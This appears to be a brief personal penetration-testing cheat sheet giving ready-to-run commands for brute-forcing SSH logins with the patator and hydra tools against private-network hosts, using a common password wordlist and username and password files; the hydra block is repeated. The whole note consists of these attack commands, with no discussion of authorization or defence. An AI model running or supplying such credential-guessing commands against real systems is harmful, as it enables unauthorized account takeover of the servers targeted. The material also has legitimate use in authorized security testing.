# Hydra alternative patator from : https://github.com/lanjelot/patator

## bruteforce a lot of services or example ssh
```cheat patator ssh login
patator ssh_login host=10.10.10.x port=22022 user=admin password=FILE0 0=/usr/share/seclists/Passwords/common-credentials/best1050.txt
```


##Hydra


```cheat
hydra -l root -p admin 192.168.1.105 -t 4 ssh
hydra -L user.txt -P passwords.txt 192.168.1.105 ssh

hydra -l root -p admin 192.168.1.105 -t 4 ssh
hydra -L user.txt -P passwords.txt 192.168.1.105 ssh
```

tags: #ssh #hydra #patator #bruteforce #christian 
